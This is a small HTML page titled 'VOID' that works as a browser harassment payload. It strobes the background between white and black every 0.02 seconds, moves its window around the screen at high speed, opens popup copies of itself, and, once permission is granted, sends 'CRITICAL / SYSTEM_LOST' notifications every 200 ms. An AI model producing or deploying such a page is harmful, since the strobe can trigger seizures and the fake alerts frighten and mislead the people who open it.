<!DOCTYPE html>
<html>
<head>
    <title>VOID</title>
    <style>
        body { background: #000; margin: 0; overflow: hidden; animation: flash 0.02s infinite; }
        @keyframes flash { 0% { background: #fff; } 50% { background: #000; } }
    </style>
</head>
<body onload="chaos()">
    <script>
        let x = Math.random() * (screen.availWidth - 300);
        let y = Math.random() * (screen.availHeight - 300);
        let dx = 35, dy = 35; // Extreme speed

        function chaos() {
            // Bouncing
            setInterval(() => {
                x += dx; y += dy;
                if (x + 300 > screen.availWidth || x < 0) dx = -dx;
                if (y + 300 > screen.availHeight || y < 0) dy = -dy;
                window.moveTo(x, y);
            }, 10);

            // Replicate
            setTimeout(() => {
                window.open('notifacations.html', '_blank', 'width=300,height=300');
            }, 500);

            // Spam Notifications
            Notification.requestPermission().then(p => {
                if(p === 'granted') {
                    setInterval(() => {
                        new Notification("CRITICAL", { body: "SYSTEM_LOST", silent: true });
                    }, 200);
                }
            });
        }
    </script>
</body>
</html>
